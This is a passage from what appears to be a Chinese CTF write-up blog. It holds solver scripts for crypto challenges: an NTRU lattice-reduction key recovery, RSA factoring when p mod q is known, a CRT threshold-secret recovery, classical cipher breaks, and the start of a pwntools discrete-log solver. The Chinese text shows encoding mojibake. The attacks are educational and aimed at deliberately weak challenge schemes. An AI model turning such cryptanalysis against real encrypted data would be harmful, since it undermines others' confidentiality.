class="line">print(bytes.fromhex(hex(pow(c[<span class="number">0</span>], d, n[<span class="number">0</span>]))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'SCTF&#123;673ff064da31c0d7aee56884b01a09&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h3><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>è€ƒå¯Ÿ<strong>Attack on NTRU Cryptosystem</strong></p><p>NTRU - Nth Degree Truncated Polynomial Ring Units</p><p>$R=Z[x]/(x^{n}-1)$: <strong>quotient</strong></p><ul><li><p>$0^{th}$ step. Variable and Func prepared</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">d = </span><br><span class="line">q = </span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line"></span><br><span class="line"><span class="comment"># return an n-coef polynomial where exactly d coef are nonzero(Â±1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_poly</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(d &lt;= n)</span><br><span class="line">    result = n * [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(d):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = randrange(n)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result[r]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        result[r] = <span class="number">1</span> - <span class="number">2</span> * randrange(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> R(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># balance coef between -q/2 and q/2 (mod q)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># return h which f*h=p*u+1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="comment"># return h which f*h=q*u+1 (q=2^m, m\in N*)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_powerof2</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(q.is_power_of(<span class="number">2</span>))</span><br><span class="line">    g = invert_mod_prime(f, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = balance_mod(f * g, q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = balance_mod(g * (<span class="number">2</span> - r), q)</span><br></pre></td></tr></table></figure></li><li><p>$1^{st}$ step. Key Generation</p><p>Select a prime p and genkey with the func below,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = random_poly()</span><br><span class="line">            fp = invert_mod_prime(f, p)</span><br><span class="line">            fq = invert_mod_powerof2(f, q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    g = random_poly()</span><br><span class="line">    pubkey = balance_mod(p * g * fq, q)</span><br><span class="line">    prikey = f, fp</span><br><span class="line">    <span class="keyword">return</span> pubkey, prikey</span><br></pre></td></tr></table></figure></li><li><p>$2^{nd}$ step. Encryption</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(m, pubkey)</span>:</span></span><br><span class="line">    r = random_poly()</span><br><span class="line">    <span class="keyword">return</span> balance_mod(pubkey * r + m, q)</span><br></pre></td></tr></table></figure></li><li><p>$3^{rd}$ step. Decryption</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(c, prikey)</span>:</span></span><br><span class="line">    f, fp = prikey</span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="keyword">return</span> balance_mod(a * fp, p)</span><br></pre></td></tr></table></figure><p>Explain why it works,</p><p>On Zmod(q), $c=h<em>r+m=p</em>g<em>fq</em>r+m$.</p><p>$a=c<em>f=p</em>g<em>(f</em>fq)<em>r+f</em>m=p<em>g</em>r+f*m$.</p><p>$a<em>fp=p</em>g<em>r</em>fp+(f<em>fp)</em>m$, <strong>and it equals to m on Zmod(p).</strong></p><p>å½“$p<em>g</em>r+f<em>m$åœ¨Zmod(q)ä¸Šå’ŒZZä¸Šå®Œå…¨ç­‰ä»·ï¼Œæˆ–æ˜¯è¯´è¯¥å¤šé¡¹å¼ç³»æ•°å‡è½åœ¨$(-q/2,q/2)$æ—¶ï¼Œè§£å¯†å¯è¡Œæ€§æˆç«‹ï¼Œä¸ªäººåšç²—ç•¥å‚æ•°ä¼°è®¡åå‘ç°åº”æ»¡è¶³$2d(p+1)&lt;q$ï¼ˆæœ‰paperä¸Šç»™å‡º<em>*p(6d+1)&lt;q</em></em>ï¼Œä½†è¯æ˜æš‚æ—¶æ²¡æ—¶é—´çœ‹ojzï¼‰</p></li></ul><p>ä¸‹å†ç»™å‡ºé’ˆå¯¹NTRUçš„æ”»å‡»ï¼š</p><p>On Zmod(q), $h=p<em>g</em>fq=p*g/f$.</p><p>Let $hp=p<em>p^{-1}</em>g/f$, so we have $g=f*hp$.</p><p>fâ€™s coef $\in \{-1,0,1\}$, this means g is obtained as a combination of the polys $q,qx,qx^{2},â€¦,qx^{n-1},hp,hp<em>x,hp</em>x^{2},â€¦,hp*x^{n-1}$.</p><p>Assume $hp=\sum a_{i}x^{i}$,</p><script type="math/tex; mode=display">\left[\begin{matrix}q & 0 & ... & ... & 0 & ... & ... & 0\\0 & q & 0 & ... & 0 & ... & ... & 0\\... & ... & ... & ... & ... & ... & ... & ...\\0 & 0 & ... & q & 0 & ... & ... & 0\\a_{0} & a_{1} & ... & a_{n-1} & 1 & 0 & ... & 0\\a_{n-1} & a_{0} & ... & a_{n-2} & 0 & 1 & ... & 0\\... & ... & ... & ... & ... & ... & ... & ...\\a_{1} & a_{2} & ... & a_{0} & 0 & 0 & ... & 1\\\end{matrix}\right]</script><p>å¯¹ä¸Šè¿°æ ¼å­ä½œè§„çº¦ï¼ŒSVPå¾—åˆ°çš„å‘é‡å¦‚æœå‘ˆç°gçš„{0, 1, -1}ç‰¹æ€§ä¸”æ£€éªŒé€šè¿‡ï¼Œåˆ™æ”»å‡»æˆåŠŸ</p><p>ä»¥$R(AL[0][n:])$ä½œä¸ºfè¿›è¡Œdec.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">109</span></span><br><span class="line">d = <span class="number">9</span></span><br><span class="line">q = <span class="number">2048</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line"></span><br><span class="line">pubkey = </span><br><span class="line">pubkey = R(pubkey)</span><br><span class="line">c = </span><br><span class="line">c = R(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(c, prikey)</span>:</span></span><br><span class="line">    f, fp = prikey</span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="keyword">return</span> balance_mod(a * fp, p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(pubkey, c)</span>:</span></span><br><span class="line">    A = Matrix(ZZ, <span class="number">2</span> * n, <span class="number">2</span> * n)</span><br><span class="line">    hp = inverse(p, q) * pubkey</span><br><span class="line">    hp_list = list(hp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        A[i, i] = q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n, <span class="number">2</span> * n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            A[i, j] = hp_list[(j - i) % n]</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">    AL = A.BKZ()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> AL:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = R(row[n:].list())</span><br><span class="line">            fp = invert_mod_prime(f, p)</span><br><span class="line">            <span class="keyword">return</span> dec(c, (f, fp))</span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># may failed with shortest vector(return more if failed)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">m = crack(pubkey, c)</span><br><span class="line">flag = <span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> list(m))</span><br><span class="line">pad = <span class="number">8</span> - len(flag) % <span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(pad + <span class="number">1</span>):</span><br><span class="line">    print(long_to_bytes(int(<span class="string">'0'</span> * i + flag + <span class="string">'0'</span> * (pad - i), <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'\x80Fdl\xccfj\xc4pr\xc8fF\x80'</span></span><br><span class="line"><span class="string">b'@#26f35b89d3#@'</span></span><br><span class="line"><span class="string">b' \x11\x99\x1b3\x19\x9a\xb1\x1c\x1c\xb2\x19\x91\xa0'</span></span><br><span class="line"><span class="string">b'\x10\x08\xcc\x8d\x99\x8c\xcdX\x8e\x0eY\x0c\xc8\xd0'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(ACTF2020)</title>
      <link href="/2020/06/06/WriteUp-ACTF2020/"/>
      <url>/2020/06/06/WriteUp-ACTF2020/</url>
      
        <content type="html"><![CDATA[<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>æœŸæœ«æœˆäº†quqï¼Œæ‰“å®ŒRCTF(å¤šå…ƒcoppersmithé²¨æˆ‘ğŸ˜­)åï¼Œå›æ¥æ‰“äº†ä¸€æ³¢æ ¡èµ›ï¼ˆwebå¬åŒå­¦è¯´åº”è¯¥æœ‰ä¸¶é¡¶ï¼Œä½†é€€å‘webæ‰‹å·²ç»çœ‹ä¸ä¸‹å»äº†- -ï¼Œcryè¿™æ¬¡åº”è¯¥è€ƒè™‘åˆ°äº†æœ‰å­¦å¼Ÿå­¦å¦¹ï¼Œæ‰€ä»¥åå¼•å¯¼å‘ï¼‰</p><p>è¿™æ¬¡ACTFæ‰“å®Œ<strong>çœŸ</strong>å›å»è¡¥è¯¾å†…ddläº†ï¼ˆé€ƒ</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Column-Permutation-Cipher"><a href="#Column-Permutation-Cipher" class="headerlink" title="Column Permutation Cipher"></a>Column Permutation Cipher</h3><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>ç®€å•åˆ—ç½®æ¢å¯†ç ï¼Œçˆ†ç ´key</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ct = </span><br><span class="line">ct_len = len(ct)</span><br><span class="line">pt = [<span class="string">'?'</span>] * ct_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, ct_len // <span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> (ct_len % i) != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">print(i)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(ct_len // i):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(j, ct_len, ct_len // i):</span><br><span class="line">pt[cnt] = ct[k]</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span>.join(pt)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"actf"</span> <span class="keyword">in</span> flag:</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="æˆ‘çš„å¯†ç æœ¬"><a href="#æˆ‘çš„å¯†ç æœ¬" class="headerlink" title="æˆ‘çš„å¯†ç æœ¬"></a>æˆ‘çš„å¯†ç æœ¬</h3><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>æ›¿æ¢å¯†ç ï¼Œpté©¬ä¸è·¯å¾·é‡‘i have a dreamï¼Œå†™å­—å…¸è·‘è„šæœ¬è¿˜ä¸å¦‚ç›´æ¥sublime- -</p><h3 id="bomb-or-boom"><a href="#bomb-or-boom" class="headerlink" title="bomb or boom"></a>bomb or boom</h3><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>æŠ«cryçš®miscé¢˜ï¼Œbloom (k, n)é—¨é™æ–¹æ¡ˆ(k = 4, n = 5)</p><ul><li>Secret 1: åŸ¹æ ¹</li><li>Secret 2: ç›²æ–‡ <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></li><li>Secret 4: AAencode</li><li>Secret 5: Brainfuck</li></ul><p>bloomé—¨é™æ¢å¤æ˜æ–‡å³å¯.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="number">2891369521230520600</span></span><br><span class="line">m1 = <span class="number">5539166121540472709</span></span><br><span class="line">a2 = <span class="number">5485400237604727152</span></span><br><span class="line">m2 = <span class="number">9993590208169240051</span></span><br><span class="line">a3 = <span class="number">15126620242797492888</span></span><br><span class="line">m3 = <span class="number">38726457607077802967</span></span><br><span class="line">a4 = <span class="number">63558232650391605454</span></span><br><span class="line">m4 = <span class="number">134070550878039878083</span></span><br><span class="line">a = [a1, a2, a3, a4]</span><br><span class="line">m = [m1, m2, m3, m4]</span><br><span class="line">print(bytes.fromhex(hex(crt(a, m))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h3 id="naive-encryption"><a href="#naive-encryption" class="headerlink" title="naive encryption"></a>naive encryption</h3><p>Enc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">k = [...]</span><br><span class="line">len_k = len(k)</span><br><span class="line">len_flag = len(flag)</span><br><span class="line">...</span><br><span class="line">cipher = flag</span><br><span class="line">n = <span class="number">1000</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len_flag):</span><br><span class="line">        cipher[i] = (cipher[i] * k[(n + <span class="number">2</span>) % len_k] + k[(n * <span class="number">7</span>) % len_k]) &amp; <span class="number">0xff</span></span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">print(cipher)</span><br></pre></td></tr></table></figure><p>Dec</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cipher [i] = ((cipher[i] - k[(n * <span class="number">7</span>) % len_k]) * inverse(k[(n + <span class="number">2</span>) % len_k], <span class="number">0x100</span>)) % <span class="number">0x100</span></span><br></pre></td></tr></table></figure><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = [...]</span><br><span class="line">k = [...]</span><br><span class="line">len_k = len(k)</span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> n &lt;= <span class="number">1000</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">        cipher [i] = ((cipher[i] - k[(n * <span class="number">7</span>) % len_k]) * inverse(k[(n + <span class="number">2</span>) % len_k], <span class="number">0x100</span>)) % <span class="number">0x100</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line">print(bytes(cipher))</span><br></pre></td></tr></table></figure><h3 id="naive-rsa"><a href="#naive-rsa" class="headerlink" title="naive rsa"></a>naive rsa</h3><h4 id="é¢˜è§£åˆ†æ-3"><a href="#é¢˜è§£åˆ†æ-3" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>å·²çŸ¥$a=p\%q$ï¼Œå³$p=iq+a$ï¼Œçˆ†ç ´iä½¿å¾—æ–¹ç¨‹åœ¨ZZä¸‹æœ‰è§£å³å¯.</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">1</span>, <span class="number">2</span>**<span class="number">21</span>)):</span><br><span class="line">    r, _ = iroot(a**<span class="number">2</span> + <span class="number">4</span> * i * n, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> _:</span><br><span class="line">        q = (-a + int(r)) // (<span class="number">2</span> * i)</span><br><span class="line">        <span class="keyword">assert</span>(n % q == <span class="number">0</span>)</span><br><span class="line">        p = n // q</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="DLPå¤´å·ç©å®¶"><a href="#DLPå¤´å·ç©å®¶" class="headerlink" title="DLPå¤´å·ç©å®¶"></a>DLPå¤´å·ç©å®¶</h3><h4 id="é¢˜è§£åˆ†æ-4"><a href="#é¢˜è§£åˆ†æ-4" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><ul><li>level1: <code>p=getPrime(33)</code>ï¼ŒBSGSå¤æ‚åº¦æ§åˆ¶åœ¨$O(2^{16})$.</li><li>level2: ç»™å‡º$g,g^{k}\ mod\ p,m*g^{dk}\ mod\ p$ï¼Œä¸”<code>d=bytes_to_long(message[0:2])</code>ï¼Œæ‰€ä»¥åœ¨0xffffä¸‹çˆ†ç ´då³å¯è¿˜åŸm.</li><li>level3: å‘ç°å¹¶ä¸æ˜¯ECDLP- -å› ä¸ºæœ€åç»™å‡ºçš„cipherä¸æ˜¯æ›²çº¿ä¸Šçš„ç‚¹ï¼Œè€Œæ˜¯å®æ•°èŒƒå›´ä¸Šçš„<code>message[k]*k_Q_x</code>ï¼Œå‘ç°æºç ä¸­çš„<code>get_ng</code>å‡½æ•°å®é™…ä¸Šå°±æ˜¯å°†æ¤­åœ†ä¸Šçš„ç‚¹*100ï¼Œäºæ˜¯é¢˜ç›®ç»™å‡ºåŸºç‚¹Gï¼Œæ±‚å‡º$C=100^{2}G$ï¼Œ$chr(cipher//C_{x})$å³ä¸ºå¯¹åº”æ˜æ–‡å­—èŠ‚ï¼Œé€ä½æ¢å¤å³å¯. </li></ul><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">flag_dist = 